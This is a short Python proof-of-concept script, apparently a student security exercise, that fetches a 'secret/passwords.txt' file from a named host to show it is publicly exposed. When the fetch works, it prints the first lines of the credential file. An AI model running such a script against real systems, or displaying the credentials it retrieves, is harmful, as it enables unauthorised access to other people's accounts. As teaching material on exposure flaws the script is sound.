#  Author: Ifrad Hossain 101587843
#  Vulnerability: Exposed Passwords in Public Directory
#  Target: files.0x10.cloud

'''This script connects to the target URL and attempts to read
a file that should be kept secret. Sensitive files like 
passwords.txt being publicly accessible is a major security risk,
as attackers can use these credentials to compromise the system.'''


import urllib.request
import urllib.error
import time

target_url = "https://files.0x10.cloud/secret/passwords.txt"
print("=" * 50)
print("  Checking for Exposed Sensitive Files")
print("=" * 50)
print(f"\n  Target: {target_url}")
print("  Scanning...")

time.sleep(0.15)

try:
    response = urllib.request.urlopen(target_url, timeout=5)
    
    if response.status == 200:
        content = response.read().decode('utf-8')
        print("VULNERABILITY FOUND")
        print(f"Successfully accessed restricted file: passwords.txt")
        print(f"Security Risk: Sensitive credentials are publicly exposed in plaintext.")
        print(f"An attacker can use this information to gain unauthorized access.")
        print("\n  --- File Snippet ---")
        
        lines = content.split('\n')
        for line in lines[:4]:
            if line.strip():
                print(f"  {line.strip()}")
        print("  ... (truncated for security) ...")

except urllib.error.HTTPError as e:
    # If the server properly blocks access
    print(f"\n  [OK] Server denied access or file not found. HTTP Status: {e.code}")
except Exception as e:
    # Catching general connection or socket errors
    print(f"\n  [ERROR] Could not connect or retrieve data: {e}")

print("\n" + "=" * 50)
